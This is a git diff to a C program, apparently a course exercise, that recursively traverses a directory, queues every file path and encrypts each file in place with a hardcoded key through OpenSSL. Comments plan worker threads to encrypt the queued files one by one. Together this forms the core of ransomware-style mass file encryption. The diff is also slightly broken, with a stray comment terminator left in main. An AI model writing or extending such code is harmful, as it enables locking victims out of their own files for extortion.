@@ -1,11 +1,54 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <dirent.h>
+#include <sys/stat.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
+#include "encryption.h"
+#include "queue.h"
+
+Queue q;
 
 void traverse(const char *path) {
     // TODO: schould traverse the file system, starting with path and stock the path in a queue.
+    
+    unsigned char key[16] = "qwertyuiopasdfgh"; //TEMPORARY BUT SHOULD NOT BE THERE
+
+    struct dirent *entry;
+    DIR *dir = opendir(path);
+
+    if (!dir) {
+        perror("opendir");
+        return;
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        // Skip current and parent directory
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        char fullPath[1024];
+        snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);
+
+        struct stat statbuf;
+        if (stat(fullPath, &statbuf) == -1) {
+            perror("stat");
+            continue;
+        }
+
+        if (S_ISDIR(statbuf.st_mode)) {
+            printf("Directory: %s\n", fullPath);
+            traverse(fullPath);  // recursive call
+        } else {
+            printf("File: %s\n", fullPath);
+            enqueue(&q, fullPath);
+            encrypt_file(fullPath, key);
+            //decrypt_file(fullPath, key);
+        }
+    }
+
+    closedir(dir);
 }
 
 void encrypt_file(char *file, unsigned char* key) {
@@ -118,16 +161,15 @@ void decrypt_file(char *file, unsigned char* key) {
 
 int main() {
     
-    //RAND_bytes(key, sizeof(key));
-    unsigned char key[16] = "qwertyuiopasdfgh";
-    char *file = "sample.pdf";
+    // TODO: schould create Threads that pull the queue and encrypt the files one by one.
 
-    /* TODO: pull the queue to encrypt
-    while (queue != null) {
-        encrypt_file(file, key);
-    }
+    //RAND_bytes(key, sizeof(key));
+    //char *file = "sample.pdf";
+    initializeQueue(&q);
+
+    traverse("/home/drikson/Documents/DPI/Lectures"); //change
     */
-    encrypt_file(file, key);
+    //encrypt_file(file, key);
     //decrypt_file(file, key);
 
     return 0; 
